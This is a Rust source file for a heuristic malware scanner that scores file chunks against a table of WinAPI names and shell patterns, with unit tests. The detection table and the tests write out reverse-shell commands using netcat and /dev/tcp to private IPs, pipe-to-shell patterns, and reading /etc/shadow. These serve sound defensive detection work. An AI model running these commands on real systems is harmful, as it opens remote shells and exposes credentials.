//! Intent scanner — heuristic detection of suspicious API references and patterns.
//!
//! Runs on EVERY chunk (not just the first). Works on raw bytes via
//! `from_utf8_lossy` so non-text files don't cause panics. Also maintains
//! context across chunk boundaries via a small ring buffer (managed by the
//! caller/orchestrator).

use anyhow::Result;

/// Result from intent scanning a single chunk.
#[derive(Debug, Default, Clone)]
pub struct IntentResult {
    /// Whether any red-flag pattern was found in this chunk.
    pub flagged: bool,
    /// List of specific flags triggered.
    pub flags: Vec<String>,
    /// Risk contribution from this scan.
    pub risk: f32,
}

/// Ceiling on risk from *indicative* patterns, however many of them match.
///
/// This constant is the difference between a working scanner and one that
/// blocks Notepad.
///
/// A string match proves only that a sequence of bytes appears somewhere in
/// the file. `pe.rs` says it best in its own documentation: an entry in the
/// import table means the loader has been *told* to resolve that function,
/// whereas a string "can come from anywhere in the file — including one
/// sitting in a help message or a false positive from compressed data".
///
/// Real Windows programs are full of these strings. `notepad.exe` references
/// `RegSetValue`, `RegCreateKey`, `ShellExecuteW` and `IsDebuggerPresent`,
/// which summed to 1.25 and blocked a Microsoft-signed binary outright at the
/// streaming stage — before the whole-file pass, and therefore before
/// Authenticode verification could say who signed it.
///
/// So indicative patterns accumulate, but only up to here.
///
/// The value is set below `risk.sandbox_threshold` (0.40), not merely below
/// `risk.block_threshold`. That is the stronger claim and it is the correct
/// one: **API names in a program are not evidence of anything on their own.**
/// A capped 0.6 still left `notepad.exe` at 0.65 and therefore undeliverable —
/// a quieter false positive than blocking it, and just as wrong, because every
/// ordinary Windows program would land in the same band.
///
/// These strings earn their place as *corroboration*. Beside a magic-byte
/// mismatch — API names in a file claiming to be a JPEG — they push a verdict
/// over the line, and `deep_forensic_scan` adds the two together for exactly
/// that case. Alone, in a file that admits to being a program, they mean
/// nothing and must not move it out of Release.
///
/// If `sandbox_threshold` is ever lowered, lower this with it.
const MAX_INDICATIVE_RISK: f32 = 0.35;

/// Whether a pattern is conclusive by itself.
#[derive(Debug, Clone, Copy, PartialEq)]
enum Weight {
    /// A literal attack payload. A reverse shell command is not a coincidence,
    /// and there is no benign program that contains one. These keep their full
    /// risk and may block alone.
    Decisive,
    /// An API name, tool name or registry path. Real evidence, but ordinary
    /// software references these constantly. Accumulates up to
    /// [`MAX_INDICATIVE_RISK`] and no further.
    Indicative,
}

use Weight::{Decisive, Indicative};

/// WinAPI strings and shell patterns commonly used by malware.
///
/// `(pattern, risk, weight, description)`.
static WINAPI_RED_FLAGS: &[(&str, f32, Weight, &str)] = &[
    // --- API names. Every one of these appears in ordinary software. -------
    ("CreateRemoteThread",     0.6,  Indicative, "Process injection via remote thread"),
    ("VirtualAllocEx",         0.5,  Indicative, "Remote memory allocation — injection precursor"),
    ("WriteProcessMemory",     0.5,  Indicative, "Remote memory write — injection precursor"),
    ("SetWindowsHookEx",       0.55, Indicative, "Keylogger / global hook installation"),
    ("RegSetValue",            0.3,  Indicative, "Registry write — possible persistence"),
    ("RegCreateKey",           0.25, Indicative, "Registry key creation — possible persistence"),
    ("InternetOpenA",          0.4,  Indicative, "C2 call-home (WININET)"),
    ("InternetOpenW",          0.4,  Indicative, "C2 call-home (WININET)"),
    ("URLDownloadToFile",      0.55, Indicative, "Downloads additional payload"),
    ("ShellExecuteA",          0.35, Indicative, "Shell execution — dropper behavior"),
    ("ShellExecuteW",          0.35, Indicative, "Shell execution — dropper behavior"),
    ("CreateService",          0.5,  Indicative, "Service installation — persistence"),
    ("OpenSCManager",          0.45, Indicative, "Service control manager access"),
    ("IsDebuggerPresent",      0.35, Indicative, "Anti-debug / sandbox evasion"),
    ("CheckRemoteDebuggerPresent", 0.4, Indicative, "Anti-debug / sandbox evasion"),
    ("NtQueryInformationProcess",  0.4, Indicative, "Anti-debug / sandbox evasion via NtAPI"),
    ("powershell",             0.35, Indicative, "PowerShell invocation in binary"),
    ("cmd.exe",                0.3,  Indicative, "CMD shell invocation in binary"),
    ("wscript.exe",            0.45, Indicative, "WScript invocation — script dropper"),
    ("mshta.exe",              0.5,  Indicative, "MSHTA execution — LOLBin abuse"),
    ("certutil",               0.45, Indicative, "Certutil — LOLBin, often used to decode payloads"),
    ("bitsadmin",              0.45, Indicative, "BITS job creation — payload download / persistence"),
    ("/etc/passwd",            0.55, Indicative, "Passwd file access"),
    ("chmod 777",              0.4,  Indicative, "World-writable permission set"),

    // --- Literal attack payloads. No benign program contains these. --------
    //
    // A specific autorun registry path, a reverse shell command line, or the
    // EICAR string is not an API a program might legitimately reference — it
    // is the attack itself, written out. These keep their full weight.
    ("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0.7, Decisive,
     "Autorun registry key — persistence"),
    ("/etc/shadow",            0.7,  Decisive, "Shadow file access — credential theft"),
    ("curl | bash",            0.7,  Decisive, "Pipe-to-bash — remote code execution pattern"),
    ("wget -O- |",             0.65, Decisive, "Pipe-to-shell — remote code execution pattern"),
    ("nc -e /bin/sh",          0.8,  Decisive, "Netcat reverse shell"),
    ("nc -e /bin/bash",        0.8,  Decisive, "Netcat reverse shell"),
    ("/dev/tcp/",              0.7,  Decisive, "Bash TCP socket — reverse shell pattern"),
    ("EICAR-STANDARD-ANTIVIRUS-TEST-FILE", 1.0, Decisive, "EICAR Antivirus Test File signature"),
];

/// Scan a chunk (and optionally a small prefix from the previous chunk for
/// cross-boundary context) for dangerous intent markers.
///
/// `context_prefix` is typically the last N bytes of the previous chunk, so
/// patterns split across a chunk boundary are not missed.
/// Extract ASCII text stored as UTF-16LE.
///
/// Windows PE files store API names in the import table as ASCII, but almost
/// every *wide* string — `CreateRemoteThreadW` arguments, registry paths,
/// embedded commands, .NET metadata — is UTF-16LE. There,
/// `CreateRemoteThread` is `43 00 72 00 65 00 61 00 ...`, which
/// `String::from_utf8_lossy` renders as `C<FFFD>r<FFFD>e<FFFD>a...` and never
/// matches. The red-flag table is overwhelmingly Windows API names, so scanning
/// only the UTF-8 view left the scanner blind to most of what it hunts for.
///
/// `align` handles both byte alignments, since a chunk boundary can land
/// mid-character.
///
/// Non-matching pairs become NUL rather than being skipped: skipping would
/// splice unrelated fragments together and manufacture matches that are not in
/// the file. No pattern contains NUL, so it is a safe separator.
fn utf16le_ascii_view(data: &[u8], align: usize) -> String {
    if data.len() <= align {
        return String::new();
    }
    data[align..]
        .chunks_exact(2)
        .map(|pair| {
            if pair[1] == 0 && (pair[0].is_ascii_graphic() || pair[0] == b' ') {
                pair[0] as char
            } else {
                '\0'
            }
        })
        .collect()
}

pub fn detect_dangerous_intent(data: &[u8], context_prefix: Option<&[u8]>) -> Result<IntentResult> {
    // Prefix + current chunk, so a pattern straddling a chunk boundary is
    // still found.
    let owned: Vec<u8>;
    let bytes: &[u8] = if let Some(prefix) = context_prefix {
        owned = prefix.iter().chain(data.iter()).copied().collect();
        &owned
    } else {
        data
    };

    // Scan BOTH encodings. Lossy UTF-8 catches ASCII strings and import names;
    // the two UTF-16LE alignments catch wide strings.
    let utf8_view = String::from_utf8_lossy(bytes);
    let utf16_even = utf16le_ascii_view(bytes, 0);
    let utf16_odd = utf16le_ascii_view(bytes, 1);

    let mut flags: Vec<String> = Vec::new();
    // Tracked separately, because the two classes combine differently.
    let mut indicative_risk: f32 = 0.0;
    let mut decisive_risk: f32 = 0.0;

    for &(pattern, risk, weight, description) in WINAPI_RED_FLAGS {
        let encoding = if utf8_view.contains(pattern) {
            Some("utf-8")
        } else if utf16_even.contains(pattern) || utf16_odd.contains(pattern) {
            Some("utf-16le")
        } else {
            None
        };

        if let Some(enc) = encoding {
            tracing::warn!(
                pattern = pattern,
                risk = risk,
                encoding = enc,
                weight = ?weight,
                description = description,
                "Intent flag triggered"
            );
            flags.push(format!("[risk={risk:.2}] {pattern} ({enc}): {description}"));

            match weight {
                // Accumulates, then stops. See MAX_INDICATIVE_RISK: a program
                // referencing four Windows APIs is a program, not a verdict.
                Indicative => {
                    indicative_risk = (indicative_risk + risk).min(MAX_INDICATIVE_RISK);
                }
                // Max rather than sum. Two reverse-shell patterns in one file
                // is the same fact observed twice, not twice the evidence.
                Decisive => {
                    decisive_risk = decisive_risk.max(risk);
                }
            }
        }
    }

    let flagged = !flags.is_empty();
    Ok(IntentResult {
        flagged,
        flags,
        // The stronger of the two classes, not their sum. A decisive hit does
        // not become more decisive because ordinary API names sit beside it.
        risk: indicative_risk.max(decisive_risk).min(1.0),
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_clean_buffer() {
        let data = b"Hello world, this is a clean file content.";
        let res = detect_dangerous_intent(data, None).unwrap();
        assert!(!res.flagged);
        assert_eq!(res.risk, 0.0);
    }

    #[test]
    fn test_winapi_injection_flag() {
        let data = b"Some code calling CreateRemoteThread to inject shellcode";
        let res = detect_dangerous_intent(data, None).unwrap();
        assert!(res.flagged, "CreateRemoteThread not detected");
        assert!(
            res.flags.iter().any(|f| f.contains("CreateRemoteThread")),
            "the match must name the pattern: {:?}",
            res.flags
        );
    }

    #[test]
    fn test_cross_boundary_pattern() {
        let prefix = b"Executing CreateRemote";
        let chunk = b"Thread now!";
        let res = detect_dangerous_intent(chunk, Some(prefix)).unwrap();
        assert!(res.flagged, "pattern split across a chunk boundary was missed");
    }

    /// The false-positive guard, and the reason [`MAX_INDICATIVE_RISK`] exists.
    ///
    /// `notepad.exe` references these four APIs. Before the cap they summed to
    /// 1.25 and blocked a Microsoft-signed binary outright; capped at 0.6 they
    /// still held it undelivered. API names in a program are not evidence
    /// against it, so the total must stay below `sandbox_threshold` (0.40) and
    /// leave the file releasable on its own.
    #[test]
    fn ordinary_windows_api_names_cannot_condemn_a_file() {
        let data = b"RegSetValue RegCreateKey ShellExecuteW IsDebuggerPresent \
                     powershell cmd.exe CreateService OpenSCManager";
        let res = detect_dangerous_intent(data, None).unwrap();

        assert!(res.flagged, "the patterns should still be reported");
        assert!(
            res.risk <= MAX_INDICATIVE_RISK,
            "indicative patterns must not exceed the cap, got {}",
            res.risk
        );
        assert!(
            res.risk < 0.4,
            "eight ordinary Windows API names scored {}, which is at or above \
             sandbox_threshold — every real Windows program would be held",
            res.risk
        );
    }

    /// A literal attack payload is conclusive on its own, and must stay so.
    #[test]
    fn decisive_patterns_keep_their_full_weight() {
        for (payload, min) in [
            (b"sh -c 'nc -e /bin/sh 10.0.0.1 4444'".as_slice(), 0.8f32),
            (b"cat /etc/shadow > /tmp/out".as_slice(), 0.7),
            (b"bash -i >& /dev/tcp/10.0.0.1/8080 0>&1".as_slice(), 0.7),
        ] {
            let res = detect_dangerous_intent(payload, None).unwrap();
            assert!(
                res.risk >= min,
                "decisive payload {:?} scored only {}",
                String::from_utf8_lossy(payload),
                res.risk
            );
        }
    }

    /// Decisive and indicative patterns must not compound into a total that
    /// exceeds either — the strongest single class wins.
    #[test]
    fn classes_do_not_compound() {
        let mixed = b"nc -e /bin/sh 1.2.3.4 RegSetValue ShellExecuteW IsDebuggerPresent";
        let res = detect_dangerous_intent(mixed, None).unwrap();
        assert!(
            res.risk <= 0.8,
            "a reverse shell beside ordinary API names scored {}, above the \
             decisive pattern's own weight",
            res.risk
        );
    }

    /// Encode an ASCII string the way Windows stores wide strings.
    fn utf16le(s: &str) -> Vec<u8> {
        s.encode_utf16().flat_map(|u| u.to_le_bytes()).collect()
    }

    /// The gap this closes: PE files store wide strings as UTF-16LE, where
    /// `CreateRemoteThread` lossy-decodes to `C<FFFD>r<FFFD>e...` and never
    /// matched. Most of the red-flag table is Windows API names, so the
    /// scanner was blind to the majority of what it targets.
    #[test]
    fn detects_winapi_strings_stored_as_utf16le() {
        let data = utf16le("kernel32.dll CreateRemoteThread ntdll");
        let res = detect_dangerous_intent(&data, None).unwrap();
        assert!(
            res.flagged,
            "UTF-16LE WinAPI string not detected — the scanner is blind to wide strings"
        );
        assert!(
            res.flags.iter().any(|f| f.contains("utf-16le")),
            "match should be attributed to utf-16le: {:?}",
            res.flags
        );
    }

    /// A chunk boundary can leave a wide string on an odd byte offset.
    #[test]
    fn detects_utf16le_at_odd_alignment() {
        let mut data = vec![0xFFu8]; // one leading byte shifts alignment
        data.extend(utf16le("SetWindowsHookEx"));
        let res = detect_dangerous_intent(&data, None).unwrap();
        assert!(res.flagged, "odd-aligned UTF-16LE string missed");
    }

    /// Realistic shape: a PE header followed by wide strings.
    #[test]
    fn detects_utf16le_inside_pe_like_blob() {
        let mut data = b"MZ\x90\x00\x03\x00\x00\x00".to_vec();
        data.extend(std::iter::repeat_n(0u8, 200));
        data.extend(utf16le(
            "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        ));
        let res = detect_dangerous_intent(&data, None).unwrap();
        assert!(res.flagged, "autorun registry key in UTF-16LE was missed");
        assert!(res.risk >= 0.7, "risk was {}", res.risk);
    }

    /// Non-text pairs become NUL rather than being dropped. Dropping would
    /// splice unrelated fragments together and invent matches: here "Create"
    /// and "RemoteThread" are separated by binary data and must NOT combine.
    #[test]
    fn utf16le_view_does_not_splice_across_gaps() {
        let mut data = utf16le("Create");
        data.extend_from_slice(&[0xDE, 0xAD, 0xBE, 0xEF, 0x01, 0x02]);
        data.extend(utf16le("RemoteThread"));

        let res = detect_dangerous_intent(&data, None).unwrap();
        assert!(
            !res.flags.iter().any(|f| f.contains("CreateRemoteThread")),
            "fragments separated by binary data were spliced into a false match: {:?}",
            res.flags
        );
    }

    /// Plain binary noise must not trip anything.
    #[test]
    fn random_binary_does_not_flag() {
        let data: Vec<u8> = (0..=255u8).cycle().take(4096).collect();
        let res = detect_dangerous_intent(&data, None).unwrap();
        assert!(!res.flagged, "binary noise produced flags: {:?}", res.flags);
    }
}
